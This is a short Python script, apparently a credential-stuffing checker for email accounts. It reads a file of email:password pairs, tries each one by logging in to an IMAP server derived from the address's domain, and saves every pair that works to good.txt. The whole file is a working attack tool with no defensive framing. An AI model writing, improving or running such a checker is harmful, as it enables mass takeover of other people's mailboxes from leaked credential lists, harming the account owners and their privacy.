#!/usr/bin/python3
# -*- coding: UTF-8 -*-

import imaplib
import argparse
import sys
import os.path

def valid_file(param): # Check file extension
    ext = os.path.splitext(param)[1] # Get file extension
    if ext.lower() != '.txt':
        raise argparse.ArgumentTypeError('File must have a .txt extension')

    return param

def create_parser ():
    parser = argparse.ArgumentParser()
    parser.add_argument('inputDirectory',type=valid_file,help='Path to the input directory.')
 
    return parser

def get_mail_list(path):
    mail = []
    with open(path,'r') as f:
        for line in f:
            mail.append(line.strip())

    return mail

def mail_auth(login,password,path):
    print('%s:%s' % (login,password))
    try:
        server = login.split('@')[1]
        mail = imaplib.IMAP4_SSL('imap.'+server)
        mail.login(login,password)
        print('good')
        with open(path,'a') as f: # Сreate good.txt in script directory
            f.write('%s:%s\n' % (login,password))
    except:
        pass

def main():
    path = os.path.join(os.path.dirname(__file__),'good.txt') # Create absolute path for good.txt
    parser = create_parser()
    namespace = parser.parse_args(sys.argv[1:])
    mail = get_mail_list(namespace.inputDirectory)
  
    for data in mail:
        try:
            account = data.split(':')
            login = account[0]
            password = account[1]
            mail_auth(login,password,path)
        except IndexError:
            continue

if __name__ == '__main__':
    main()